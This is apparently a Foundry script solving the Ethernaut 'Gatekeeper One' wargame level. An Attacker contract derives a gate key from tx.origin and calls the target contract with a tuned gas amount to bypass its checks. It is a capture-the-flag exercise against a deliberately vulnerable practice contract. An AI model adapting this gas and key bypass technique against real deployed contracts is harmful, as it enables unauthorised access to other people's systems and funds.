// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {GatekeeperOne} from "../src/L13GatekeeperOne.sol";

contract Attacker {
    GatekeeperOne gatekeeperOne = GatekeeperOne(0x24B3c7704709ed1491473F30393FFc93cFB0FC34);

    function enter(uint256 gas) external {
        uint16 k16 = uint16(uint160(tx.origin));
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);

        require(gas < 8191, "gas >= 8191");
        require(gatekeeperOne.enter{gas: 8191 * 10 + gas}(key), "Incorrect key");
    }
}

contract L13GatekeeperOneAttack is Script, Broadcast {
    function run() external {
        Attacker attacker = new Attacker();
    }
}
